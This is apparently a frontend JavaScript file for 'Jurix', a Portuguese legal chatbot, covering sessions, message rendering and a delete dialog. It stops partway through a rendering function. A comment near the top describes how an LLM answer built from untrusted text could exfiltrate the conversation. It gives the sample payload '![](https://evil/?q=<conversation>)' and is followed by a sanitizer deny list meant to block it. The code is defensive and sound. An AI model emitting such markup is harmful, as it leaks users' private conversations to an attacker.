/**
 * Jurix Chatbot Engine
 * Full-featured Swiss Design Legal Assistant Frontend.
 * Modular, decoupled from Django HTML templates.
 */

(function () {
    'use strict';

    // ===== CONFIGURATION =====
    const config = window.JURIX_CONFIG || {
        chatbotUrl: '/assistente/',
        logoIconUrl: '/static/img/logo-icon.svg?v=20260930-quill1',
        userName: 'Admin',
    };
    const SIDEBAR_COLLAPSED_KEY = 'jurix-sidebar-collapsed';

    const chatAPI = window.JurixChatAPI;

    document.addEventListener('click', (event) => {
        const link = event.target.closest?.('a[href]');
        if (!link || event.defaultPrevented || event.button !== 0 || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) return;
        const target = new URL(link.href, window.location.href);
        if (target.origin === window.location.origin && target.pathname.replace(/\/$/, '') === window.location.pathname.replace(/\/$/, '') && target.search === window.location.search && !target.hash) event.preventDefault();
    });

    function getSessionSlugFromPath() {
        const pathname = window.location.pathname.replace(/\/+$/, '');
        const configuredBase = String(config.chatbotUrl || '/assistente/').replace(/\/+$/, '');
        if (pathname.startsWith(`${configuredBase}/`)) {
            return pathname.slice(configuredBase.length + 1).split('/')[0] || null;
        }
        const legacyMarker = '/chatbot/';
        const legacyIndex = pathname.indexOf(legacyMarker);
        if (legacyIndex >= 0) {
            return pathname.slice(legacyIndex + legacyMarker.length).split('/')[0] || null;
        }
        return null;
    }

    // ===== MARKED.JS CONFIGURATION =====
    if (typeof marked !== 'undefined') {
        marked.setOptions({
            breaks: true,
            gfm: true,
            headerIds: false,
            mangle: false,
        });
    }

    // ===== APP STATE =====
    const chatState = window.JurixChatState;
    let currentSessionId = null;
    let isStreamingGreeting = false;
    let navSeq = 0;
    let retryingExistingQuestion = null;
    let deleteModalTrigger = null;
    let activeStreamElements = null;
    let activeStreamQuestion = '';
    let pendingRetryTurnId = null;
    let pendingSessionClientId = null;

    // ===== UTILITIES =====
    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Answers are LLM output built from ingested (untrusted) text, so they are sanitised after
    // markdown rendering. DOMPurify already blocks script execution; the extra rules close a
    // second channel: markup whose only effect is that the BROWSER requests an attacker URL by
    // itself (![](https://evil/?q=<conversation>), CSS url(), <link>, <video poster>...), which
    // exfiltrates the conversation with no script at all. Legal answers need none of these tags;
    // ordinary links (<a href>) are untouched.
    const SANITIZE_CONFIG = {
        FORBID_TAGS: [
            'img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'use', 'svg', 'math',
            'style', 'link', 'form', 'input', 'button', 'textarea', 'select',
        ],
        FORBID_ATTR: ['style', 'srcset', 'poster', 'background', 'ping'],
    };

    function renderMarkdown(text, sources = []) {
        if (window.JurixMarkdown && typeof window.JurixMarkdown.render === 'function') {
            return window.JurixMarkdown.render(text, sources);
        }
        return DOMPurify.sanitize(marked.parse(text), SANITIZE_CONFIG);
    }

    // Escape for a double-quoted HTML ATTRIBUTE. escapeHtml() is not enough there: it leaves
    // quotes untouched, so a value containing " or ' could close the attribute (or a JS string
    // inside an inline handler) and inject code.
    function escapeAttr(text) {
        return String(text ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    function resetComposerSize(textarea) {
        if (!textarea) return;
        textarea.classList.remove('is-composer-medium', 'is-composer-large');
    }

    function fitComposerSize(textarea) {
        if (!textarea) return;
        resetComposerSize(textarea);
        if (textarea.scrollHeight > 68) textarea.classList.add('is-composer-large');
        else if (textarea.scrollHeight > 44) textarea.classList.add('is-composer-medium');
    }

    // Only http(s) URLs may be opened from a source card: javascript:, data:, vbscript: and
    // friends are dropped. The value comes from ingested SAPL data, i.e. it is not trusted.
    function safeHttpUrl(value) {
        if (!value) return null;
        try {
            const url = new URL(String(value), window.location.href);
            return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null;
        } catch (_) {
            return null;
        }
    }

    // The delete-session button and the suggestion chips carry their argument in a data-*
    // attribute and are wired through this ONE delegated listener, instead of an inline onclick
    // (a CSP without 'unsafe-inline' blocks every inline handler; this is required for that).
    document.addEventListener('click', (event) => {
        const deleteBtn = event.target.closest ? event.target.closest('[data-delete-session-id]') : null;
        if (deleteBtn) {
            event.stopPropagation();
            deleteSession(deleteBtn.dataset.deleteSessionId, event);
            return;
        }
        const chip = event.target.closest ? event.target.closest('.chip[data-question]') : null;
        if (chip) { askQuestion(chip.dataset.question); return; }

        // Suggestion cards and "recent search" rows carry the question in data-question.
        const questionEl = event.target.closest ? event.target.closest('[data-question]') : null;
        if (questionEl) { askQuestion(questionEl.dataset.question); return; }

        // Sidebar/header buttons that open the command palette (data-open-command-palette).
        const paletteTrigger = event.target.closest ? event.target.closest('[data-open-command-palette]') : null;
        if (paletteTrigger) {
            event.preventDefault();
            const input = document.getElementById('command-palette-trigger');
            if (input) input.click();
        }
    });

    // Source cards carry the URL in a data attribute and are opened by ONE delegated listener,
    // instead of an inline onclick that interpolated the URL into JavaScript.
    document.addEventListener('click', (event) => {
        const card = event.target.closest ? event.target.closest('.source-card-clickable[data-url]') : null;
        if (!card) return;
        if (event.target.closest('a, button, details, summary')) return;
        const url = safeHttpUrl(card.dataset.url);   // re-validated at use time
        if (url) window.open(url, '_blank', 'noopener,noreferrer');
    });

    function getCookie(name) {
        let cookieValue = null;
        if (document.cookie && document.cookie !== '') {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                if (cookie.substring(0, name.length + 1) === name + '=') {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }

    function focusComposerSafely(textarea = document.getElementById('question-textarea')) {
        const sourcesDialog = document.getElementById('jurix-sources-drawer-panel');
        if (!textarea || sourcesDialog?.getAttribute('aria-hidden') === 'false') return false;
        textarea.focus({ preventScroll: true });
        return true;
    }

    function scrollToBottom() {
        const container = document.getElementById('messages-container');
        if (!container) return;
        const messageList = document.getElementById('messages-wrapper');
        const hasConversationMessages = Boolean(messageList?.querySelector('.message'));
        if (!hasConversationMessages) {
            // The empty assistant welcome screen is taller than the available
            // scroller on common viewports. Treating it as a conversation and
            // scrolling to its bottom hides the hero heading behind the banner.
            container.scrollTop = 0;
            return;
        }
        container.scrollTop = container.scrollHeight;
    }

    function scrollToBottomIfAtBottom() {
        const container = document.getElementById('messages-container');
        if (!container) return;
        const threshold = 100;
        const isAtBottom = container.scrollHeight - container.scrollTop - container.clientHeight < threshold;
        if (isAtBottom) {
            container.scrollTop = container.scrollHeight;
        }
    }

    function revealMessageControl(control) {
        const container = document.getElementById('messages-container');
        const composer = document.getElementById('conversation-input-bar');
        if (!control || !container) return;
        const viewport = container.getBoundingClientRect();
        const composerTop = composer?.getBoundingClientRect().top ?? viewport.bottom;
        const visibleTop = viewport.top + 8;
        const visibleBottom = Math.min(viewport.bottom, composerTop) - 16;
        const rect = control.getBoundingClientRect();
        let nextTop = container.scrollTop;
        if (rect.top < visibleTop) nextTop += rect.top - visibleTop;
        else if (rect.bottom > visibleBottom) nextTop += rect.bottom - visibleBottom;
        if (nextTop !== container.scrollTop) {
            container.scrollTo({ top: Math.max(0, nextTop), behavior: 'instant' });
        }
    }

    function syncComposerScrollClearance() {
        const container = document.getElementById('messages-container');
        const composer = document.getElementById('conversation-input-bar');
        if (!container || !composer) return;

        const updateClearance = () => {
            const composerHeight = Math.ceil(composer.getBoundingClientRect().height);
            const wrapper = document.getElementById('messages-wrapper');
            const wrapperBottomPadding = wrapper
                ? Number.parseFloat(getComputedStyle(wrapper).paddingBottom) || 0
                : 0;
            const nextClearance = `${Math.max(80, composerHeight + 24 - wrapperBottomPadding)}px`;
            const messageList = document.getElementById('messages-wrapper');
            const hasConversationMessages = Boolean(messageList?.querySelector('.message'));
            const wasAtBottom = hasConversationMessages
                && container.scrollHeight - container.scrollTop - container.clientHeight < 100;
            if (container.style.getPropertyValue('--jurix-composer-clearance') === nextClearance) return;
            // The composer is fixed and overlays the scroll region. Reserve its
            // measured height plus a small reading gap, subtracting the wrapper's
            // existing bottom padding to avoid double-counting the same clearance.
            container.style.setProperty('--jurix-composer-clearance', nextClearance);
            if (wasAtBottom) {
                requestAnimationFrame(() => requestAnimationFrame(() => {
                    if (
                        container.isConnected
                        && document.getElementById('messages-wrapper')?.querySelector('.message')
                    ) container.scrollTop = container.scrollHeight;
                }));
            }
        };

        updateClearance();
        if (typeof ResizeObserver === 'function' && !composer.__jurixClearanceObserver) {
            composer.__jurixClearanceObserver = new ResizeObserver(updateClearance);
            composer.__jurixClearanceObserver.observe(composer);
        }
        if (!window.__jurixComposerClearanceResizeBound) {
            window.addEventListener('resize', updateClearance, { passive: true });
            window.__jurixComposerClearanceResizeBound = true;
        }
    }

    // The renderer commits streamed markdown in requestAnimationFrame. Expose
    // this callback so it can re-evaluate the scroll position after that commit.
    window.scrollToBottomIfAtBottom = scrollToBottomIfAtBottom;

    function shuffleArray(array) {
        const shuffled = [...array];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }
        return shuffled;
    }

    // ===== CHAT SESSIONS MANAGEMENT =====
    async function loadChatSessions() {
        try {
            const data = await chatAPI.listSessions();
            if (!data.success || !data.sessions) return;
            const sessionSlug = getSessionSlugFromPath();
            const isInNewConversation = !sessionSlug && !currentSessionId;
            const activeSessionId = isInNewConversation ? null : currentSessionId;
            window.JurixSidebar?.render(data.sessions, {
                activeSessionId,
                preserveTemporary: true,
            });
        } catch (error) {
            console.error('Error loading chat sessions:', error);
        }
    }

    function updateNewChatButtonState() {
        const newChatBtn = document.getElementById('new-chat-button');
        if (!newChatBtn) return;

        const sessionSlug = getSessionSlugFromPath();

        if (!sessionSlug && !currentSessionId) {
            newChatBtn.disabled = true;
            newChatBtn.classList.add('disabled');
        } else {
            newChatBtn.disabled = false;
            newChatBtn.classList.remove('disabled');
        }
    }

    async function createNewSession(pushHistory = true, navToken = null) {
        const thisToken = navToken !== null ? navToken : ++navSeq;
        if (thisToken !== navSeq) return;

        if (chatState && typeof chatState.isBusy === 'function' && chatState.isBusy()) {
            chatAPI?.cancelStream?.();
            chatState.transition('idle');
        }
        try {
            document.dispatchEvent(new CustomEvent('jurix:new-conversation'));
            if (pushHistory && window.location.pathname !== config.chatbotUrl) {
                window.history.pushState({}, '', config.chatbotUrl);
            }
            try { sessionStorage.setItem('jurix:new-conversation', '1'); } catch (_) {}
            if (thisToken !== navSeq) return;

            currentSessionId = null;
            if (chatState && typeof chatState.setSessionId === 'function') {
                chatState.setSessionId(null);
            }

            document.querySelectorAll('.chat-session-item').forEach((item) => {
                item.classList.remove('active');
            });

            const messagesWrapper = document.getElementById('messages-wrapper');
            if (messagesWrapper) {
                const welcomeState = document.getElementById('welcome-state');
                const messages = messagesWrapper.querySelectorAll('.message');
                messages.forEach((msg) => msg.remove());

                if (welcomeState) {
                    welcomeState.classList.remove('is-hidden');
                    if (welcomeState.parentNode !== messagesWrapper) {
                        messagesWrapper.insertBefore(welcomeState, messagesWrapper.firstChild);
                    }
                } else {
                    const newWelcomeState = document.createElement('div');
                    newWelcomeState.id = 'welcome-state';
                    newWelcomeState.className = 'welcome-state';
                    newWelcomeState.innerHTML = `
                        <h1 class="welcome-greeting">
                            <span class="greeting-text">Olá, </span>
                            <span class="greeting-name" data-user-name="${escapeHtml(config.userName)}">${escapeHtml(config.userName)}</span>
                        </h1>
                        <div class="suggestion-chips" id="suggestion-chips" role="list" aria-label="Sugestões de perguntas"></div>
                    `;
                    messagesWrapper.insertBefore(newWelcomeState, messagesWrapper.firstChild);
                }
            }

            showWelcomeStateWithStreaming();

            const textarea = document.getElementById('question-textarea');
            if (textarea) {
                textarea.value = '';
                resetComposerSize(textarea);
                window.JurixChatShell?.updateCounter();
                try {
                    const keys = Object.keys(localStorage);
                    for (let i = 0; i < keys.length; i++) {
                        const key = keys[i];
                        if (typeof key === 'string' && key.startsWith('chat-input-')) {
                            try { localStorage.removeItem(key); } catch (_) {}
                        }
                    }
                } catch (_) {}
            }
        } catch (error) {
            if (thisToken !== navSeq) return;
            console.error('Error creating new session:', error);
        } finally {
            if (thisToken === navSeq) {
                try {
                    await loadChatSessions();
                } catch (err) {
                    console.error('Error loading chat sessions in new session:', err);
                }
                if (thisToken === navSeq) {
                    updateNewChatButtonState();
                }
            }
        }
    }

    async function loadSession(sessionId, pushHistory = true, navToken = null) {
        if (!sessionId) return;
        const thisToken = navToken !== null ? navToken : ++navSeq;
        if (thisToken !== navSeq) return;

        if (chatState && typeof chatState.isBusy === 'function' && chatState.isBusy()) {
            chatAPI?.cancelStream?.();
            chatState.transition('idle');
        }

        try {
            const sessionData = await chatAPI.getSession(sessionId);
            if (thisToken !== navSeq) return;
            if (!sessionData || !sessionData.success || !sessionData.session) return;

            const sessionSlug = encodeURIComponent(sessionData.session.slug || sessionData.session.id);
            const archiveQaMode = new URLSearchParams(window.location.search).get('corpus') === 'archive-qa';
            if (archiveQaMode) {
                sessionData.session.corpus = 'archive-qa';
                window.JurixAnonymousHistory?.ensureSession?.(
                    sessionData.session.id,
                    sessionData.session.title,
                    { corpus: 'archive-qa' },
                );
            }
            const corpusQuery = sessionData.session.corpus === 'archive-qa' ? '?corpus=archive-qa' : '';
            const sessionUrl = `${config.chatbotUrl}${sessionSlug}/${corpusQuery}`;
            const currentUrl = `${window.location.pathname}${window.location.search}`;
            if (pushHistory && currentUrl !== sessionUrl) {
                window.history.pushState({}, '', sessionUrl);
            }

            if (thisToken !== navSeq) return;

            currentSessionId = sessionId;
            if (chatState && typeof chatState.setSessionId === 'function') {
                chatState.setSessionId(sessionId);
            }

            const messagesWrapper = document.getElementById('messages-wrapper');
            if (messagesWrapper) {
                const welcomeState = document.getElementById('welcome-state');
                const messages = messagesWrapper.querySelectorAll('.message');
                messages.forEach((msg) => msg.remove());

                const existingIndicator = messagesWrapper.querySelector('.messages-load-more-indicator');
                if (existingIndicator) existingIndicator.remove();

                if (welcomeState) {
                    welcomeState.classList.toggle(
                        'is-hidden',
                        Boolean(sessionData.messages && sessionData.messages.length > 0),
                    );
                }
            }

            document.querySelectorAll('.chat-session-item').forEach((item) => {
                item.classList.remove('active');
                if (String(item.dataset.sessionId) === String(sessionId)) {
                    item.classList.add('active');
                }
            });

            if (sessionData.messages && sessionData.messages.length > 0) {
                const assistantMessages = sessionData.messages.filter((m) => m.role === 'assistant');
                let messageIndex = 0;

                for (let i = 0; i < sessionData.messages.length; i++) {
                    const msg = sessionData.messages[i];
                    if (msg.role === 'user') {
                        addUserMessage(msg.content, msg.created_at, msg);
                    } else if (msg.role === 'assistant') {
                        messageIndex++;
                        const isLastAssistant = messageIndex === assistantMessages.length;
                        addAssistantMessage(
                            msg.content,
                            msg.sources || [],
                            isLastAssistant && typeof currentSessionId === 'number',
                            true,
                            msg.metadata || {},
                            msg.created_at
                        );
                    }
                }
                const conversationInput = document.getElementById('conversation-input-bar');
                if (conversationInput) {
                    conversationInput.classList.remove('jurix-floating-input-initial', 'is-hidden');
                    conversationInput.style.setProperty('display', 'flex', 'important');
                }
            }

            scrollToBottom();
            loadSavedText(sessionId);
            installHistoryPager(sessionData, sessionId);
            updateNewChatButtonState();
        } catch (error) {
            if (thisToken !== navSeq) return;
            console.error('Error loading session:', error);
            window.location.href = config.chatbotUrl;
        }
    }

    function installHistoryPager(data, sessionId) {
        const wrapper = document.getElementById('messages-wrapper');
        if (!wrapper || !data.has_more || !data.next_cursor) return;
        const button = document.createElement('button');
        button.type = 'button';
        button.className = 'messages-load-more-indicator';
        button.textContent = 'Carregar mensagens anteriores';
        wrapper.prepend(button);
        let isLoading = false;
        button.addEventListener('click', async () => {
            if (isLoading) return;
            isLoading = true;
            const container = document.getElementById('messages-container');
            const oldHeight = container?.scrollHeight || 0;
            const oldTop = container?.scrollTop || 0;
            const previousOverflowAnchor = container?.style.overflowAnchor || '';
            const previousScrollBehavior = container?.style.scrollBehavior || '';
            // The browser's automatic scroll anchoring competes with the
            // explicit delta below when the pager is removed. Disable it for
            // this single DOM transaction so pagination remains pixel-stable.
            if (container) {
                container.style.overflowAnchor = 'none';
                container.style.scrollBehavior = 'auto';
            }
            button.disabled = true;
            button.classList.add('is-loading');
            button.setAttribute('aria-busy', 'true');
            // Keep the button's geometry stable while the request is in flight.
            // Changing its label here can add a line/wrap and corrupt the
            // scroll-delta invariant used to preserve the reader's position.
            try {
                const page = await chatAPI.getSession(sessionId, data.next_cursor);
                if (String(currentSessionId) !== String(sessionId) || !button.isConnected) {
                    if (container) {
                        container.style.overflowAnchor = previousOverflowAnchor;
                        container.style.scrollBehavior = previousScrollBehavior;
                    }
                    return;
                }
                const existing = new Set(wrapper.children);
                for (const msg of page.messages || []) {
                    if (msg.role === 'user') addUserMessage(msg.content, msg.created_at, msg);
                    else addAssistantMessage(msg.content, msg.sources || [], false, true, msg.metadata || {}, msg.created_at);
                }
                const fragment = document.createDocumentFragment();
                for (const child of Array.from(wrapper.children)) {
                    if (!existing.has(child)) fragment.appendChild(child);
                }
                button.after(fragment);
                button.remove();
                installHistoryPager(page, sessionId);
                if (container) {
                    const restoreScrollPosition = () => {
                        // Force the post-pagination layout before reading the
                        // final height. Native anchoring is disabled on this
                        // scroller because the renderer maintains position.
                        void container.offsetHeight;
                        container.scrollTo({
                            top: oldTop + container.scrollHeight - oldHeight,
                            behavior: 'instant',
                        });
                    };
                    restoreScrollPosition();
                    // The message renderer may finish a detached markdown
                    // update in the same task. Re-apply after microtasks have
                    // drained, before consumers can observe the new count.
                    queueMicrotask(() => {
                        if (container.isConnected) restoreScrollPosition();
                    });
                    // Keep native anchoring disabled through the next frame;
                    // restoring it synchronously lets Chromium apply a second
                    // correction after the new pager has been inserted.
                    requestAnimationFrame(() => {
                        if (!container.isConnected) return;
                        // Fonts and newly inserted markdown can settle one frame
                        // after the DOM transaction. Re-apply the same invariant
                        // once after layout so pagination never loses a row.
                        restoreScrollPosition();
                        requestAnimationFrame(() => {
                            if (!container.isConnected) return;
                            restoreScrollPosition();
                            requestAnimationFrame(() => {
                                if (!container.isConnected) return;
                                restoreScrollPosition();
                                container.style.overflowAnchor = previousOverflowAnchor;
                                container.style.scrollBehavior = previousScrollBehavior;
                            });
                        });
                    });
                }
            } catch (_) {
                if (container) {
                    container.style.overflowAnchor = previousOverflowAnchor;
                    container.style.scrollBehavior = previousScrollBehavior;
                }
                isLoading = false;
                button.disabled = false;
                button.classList.remove('is-loading');
                button.removeAttribute('aria-busy');
                button.textContent = 'Falha ao carregar. Tentar novamente';
            }
        });
    }

    function loadSavedText(sessionId) {
        const textarea = document.getElementById('question-textarea');
        if (!textarea || !sessionId) return;
        let savedText = null;
        try { savedText = localStorage.getItem(`chat-input-${sessionId}`); } catch (_) {}
        if (savedText !== null) {
            textarea.value = savedText;
            fitComposerSize(textarea);
            window.JurixChatShell?.updateCounter();
        }
    }

    function createPendingClientSessionId() {
        const uuid = window.crypto?.randomUUID?.();
        return `jurix-${uuid || `${Date.now().toString(36)}-${Math.random().toString(36).slice(2)}`}`;
    }

    function createSessionCardImmediately(question) {
        pendingSessionClientId = createPendingClientSessionId();
        return window.JurixSidebar?.addPending?.({
            clientSessionId: pendingSessionClientId,
            question,
            title: question.length > 50 ? `${question.substring(0, 50)}...` : question,
        }) || null;
    }

    function animateSessionCreated() {
        const toast = document.createElement('div');
        toast.className = 'session-created-toast';
        const composer = document.getElementById('conversation-input-bar');
        const positionAboveComposer = () => {
            const composerTop = composer?.getBoundingClientRect().top;
            const bottomOffset = Number.isFinite(composerTop) && composerTop < window.innerHeight
                ? window.innerHeight - composerTop + 24
                : 16;
            toast.style.setProperty('--session-created-toast-bottom', `${Math.ceil(bottomOffset)}px`);
        };
        toast.innerHTML = `
            <div class="session-created-content">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
                <span>Conversa registrada no histórico</span>
            </div>
        `;
        document.body.appendChild(toast);
        positionAboveComposer();
        window.addEventListener('resize', positionAboveComposer);
        const composerResizeObserver = typeof ResizeObserver === 'function' && composer
            ? new ResizeObserver(positionAboveComposer)
            : null;
        composerResizeObserver?.observe(composer);

        requestAnimationFrame(() => {
            toast.classList.add('show');
        });

        setTimeout(() => {
            toast.classList.remove('show');
            window.removeEventListener('resize', positionAboveComposer);
            composerResizeObserver?.disconnect();
            setTimeout(() => toast.remove(), 300);
        }, 2500);
    }

    function deleteSession(sessionId, event) {
        if (!sessionId) return;
        deleteModalTrigger = event?.target?.closest?.('[data-delete-session-id]') ||
            (document.activeElement instanceof HTMLElement ? document.activeElement : null);
        showDeleteModal(sessionId);
    }

    function closeDeleteModal(modalOverlay, restoreFocus = true) {
        if (!modalOverlay) return;
        modalOverlay.classList.remove('active');
        modalOverlay.inert = true;
        modalOverlay.setAttribute('aria-hidden', 'true');
        modalOverlay.setAttribute('aria-modal', 'false');
        const appShell = document.querySelector('.figma-workspace');
        if (appShell) appShell.inert = false;

        const trigger = deleteModalTrigger;
        deleteModalTrigger = null;
        if (!restoreFocus) return;
        if (trigger?.isConnected) trigger.focus();
        else document.getElementById('new-chat-button')?.focus();
    }

    function showDeleteModal(sessionId) {
        let modalOverlay = document.getElementById('delete-session-modal');
        if (!modalOverlay) {
            modalOverlay = document.createElement('div');
            modalOverlay.id = 'delete-session-modal';
            modalOverlay.className = 'delete-modal-overlay';
            modalOverlay.setAttribute('role', 'dialog');
            modalOverlay.setAttribute('aria-modal', 'false');
            modalOverlay.setAttribute('aria-hidden', 'true');
            modalOverlay.setAttribute('aria-labelledby', 'delete-modal-title');
            modalOverlay.setAttribute('aria-describedby', 'delete-modal-description');
            modalOverlay.inert = true;
            modalOverlay.innerHTML = `
                <div class="delete-modal">
                    <div class="delete-modal-header">
                        <h3 id="delete-modal-title">Deletar conversa</h3>
                    </div>
                    <div class="delete-modal-body">
                        <p id="delete-modal-description">Tem certeza que deseja deletar esta conversa? Esta ação não pode ser desfeita.</p>
                    </div>
                    <div class="delete-modal-footer">
                        <button class="delete-modal-cancel" id="delete-modal-cancel">Cancelar</button>
                        <button class="delete-modal-confirm" id="delete-modal-confirm">Deletar</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modalOverlay);

            document.getElementById('delete-modal-cancel').addEventListener('click', (event) => {
                event.preventDefault();
                closeDeleteModal(modalOverlay);
            });

            modalOverlay.addEventListener('click', (e) => {
                if (e.target === modalOverlay) closeDeleteModal(modalOverlay);
            });

            modalOverlay.addEventListener('keydown', (event) => {
                if (event.key === 'Escape') {
                    event.preventDefault();
                    closeDeleteModal(modalOverlay);
                    return;
                }
                if (event.key !== 'Tab') return;

                const focusable = [...modalOverlay.querySelectorAll(
                    'button:not([disabled]), a[href], input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
                )].filter((element) => element.getClientRects().length > 0);
                if (!focusable.length) {
                    event.preventDefault();
                    modalOverlay.querySelector('.delete-modal')?.focus();
                    return;
                }
                const first = focusable[0];
                const last = focusable[focusable.length - 1];
                if (event.shiftKey && document.activeElement === first) {
                    event.preventDefault();
                    last.focus();
                } else if (!event.shiftKey && document.activeElement === last) {
                    event.preventDefault();
                    first.focus();
                }
            });
        }

        const confirmBtn = document.getElementById('delete-modal-confirm');
        confirmBtn.onclick = async () => {
            closeDeleteModal(modalOverlay);
            await performDeleteSession(sessionId);
        };

        modalOverlay.inert = false;
        modalOverlay.setAttribute('aria-hidden', 'false');
        modalOverlay.setAttribute('aria-modal', 'true');
        const appShell = document.querySelector('.figma-workspace');
        if (appShell) appShell.inert = true;
        requestAnimationFrame(() => {
            modalOverlay.classList.add('active');
            document.getElementById('delete-modal-cancel')?.focus();
        });
    }

    async function performDeleteSession(sessionId) {
        try {
            await chatAPI.deleteSession(sessionId);

            if (currentSessionId === sessionId) {
                currentSessionId = null;
                if (chatState && typeof chatState.setSessionId === 'function') {
                    chatState.setSessionId(null);
                }
                const messagesWrapper = document.getElementById('messages-wrapper');
                if (messagesWrapper) {
                    messagesWrapper.querySelectorAll('.message').forEach((m) => m.remove());
                }
                const welcomeState = document.getElementById('welcome-state');
                if (welcomeState) welcomeState.classList.remove('is-hidden');
                refreshCorpusSuggestions();
            }

            await loadChatSessions();
            document.getElementById('new-chat-button')?.focus();
        } catch (error) {
            console.error('Error deleting session:', error);
            showNotification('Erro ao deletar conversa. Tente novamente.', 'error');
        }
    }

    function showNotification(message, type = 'error') {
        let toast = document.getElementById('chat-toast-notification');
        if (!toast) {
            toast = document.createElement('div');
            toast.id = 'chat-toast-notification';
            toast.className = 'chat-toast-notification';
            document.body.appendChild(toast);
        }
        const isError = type === 'error';
        toast.setAttribute('role', isError ? 'alert' : 'status');
        toast.setAttribute('aria-live', isError ? 'assertive' : 'polite');
        toast.setAttribute('aria-atomic', 'true');
        toast.classList.toggle('is-error', type === 'error');
        toast.classList.toggle('is-success', type !== 'error');
        toast.textContent = '';
        window.requestAnimationFrame(() => {
            toast.textContent = message;
        });
        toast.classList.remove('is-dismissed');
        setTimeout(() => {
            toast.classList.add('is-dismissed');
        }, 3500);
    }

    // ===== MESSAGE RENDERING =====
    function addUserMessage(text, createdAt = null, turn = null) {
        if (!window.JurixChatRenderer) return;
        document.getElementById('welcome-state')?.classList.add('is-hidden');
        window.JurixChatRenderer.addUserMessage(text, {
            scrollToBottom, renderMarkdown, escapeHtml, createdAt,
            retryContext: turn?.turn_state && turn?.client_turn_id
                ? { state: turn.turn_state, clientTurnId: turn.client_turn_id }
                : null,
            onRetry(question, clientTurnId) {
                if (chatState?.isBusy?.()) return;
                retryingExistingQuestion = question;
                pendingRetryTurnId = clientTurnId;
                const input = document.getElementById('question-textarea');
                if (input) input.value = question;
                window.JurixChatShell?.updateCounter();
                const form = document.getElementById('chat-form');
                if (form?.requestSubmit) form.requestSubmit();
                else form?.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
            },
        });
    }

    function addLoadingMessage() {
        if (!window.JurixChatRenderer) return null;
        return window.JurixChatRenderer.addLoadingMessage({ config, scrollToBottom, esc: escapeHtml });
    }

    function removeLoadingMessage(loadingId) {
        const loadingMsg = document.getElementById(loadingId);
        if (loadingMsg) loadingMsg.remove();
    }

    function addAssistantMessage(
        answer,
        sources,
        showRegenerate = false,
        skipStreaming = false,
        metadata = {},
        createdAt = null
    ) {
        const messagesWrapper = document.getElementById('messages-wrapper');
        if (!messagesWrapper) return;
        document.getElementById('welcome-state')?.classList.add('is-hidden');

        const interrupted = metadata && metadata.interrupted === true;

        const timestamp = window.JurixChatRenderer?.formatTimestamp(createdAt) || new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        const uid = `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
        const messageId = 'msg-' + uid;
        const sourcesId = 'sources-' + uid;
        const copyButtonId = 'copy-btn-' + uid;
        const regenerateId = 'regenerate-' + uid;

        const messageDiv = document.createElement('div');
        messageDiv.className = `message message-assistant${interrupted ? ' message-assistant--interrupted' : ''}`;
        messageDiv.innerHTML = `
            <div class="message-avatar">
                <img src="${escapeHtml(config.logoIconUrl)}" alt="Jurix">
            </div>
            <div class="message-content">
                <div class="message-header">
                    <span class="message-role">Jurix</span>
                    ${interrupted ? '<span class="message-status message-status--interrupted" role="status">Resposta interrompida</span>' : ''}
                    <span class="message-time">${timestamp}</span>
                </div>
                <div class="message-body jurix-legal-answer" id="${messageId}"></div>
                ${interrupted ? '<p class="message-interrupted-note">A resposta foi interrompida antes de terminar. Tente novamente para gerar uma resposta completa.</p>' : ''}
                <div class="message-actions">
                    <button class="regenerate-button is-hidden" id="${regenerateId}" aria-label="Tentar novamente" title="Tentar novamente">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 3v5h-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M3 21v-5h5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                    <button class="copy-response-button" id="${copyButtonId}" aria-label="Copiar resposta em Markdown" title="Copiar resposta">
                        <svg class="copy-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" stroke-width="2"/>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/>
                        </svg>
                        <svg class="check-icon is-hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                </div>
                <div id="${sourcesId}"></div>
            </div>
        `;

        messagesWrapper.appendChild(messageDiv);
        scrollToBottom();

        const sourcesContainer = messageDiv.querySelector(`#${sourcesId}`) || document.getElementById(sourcesId);
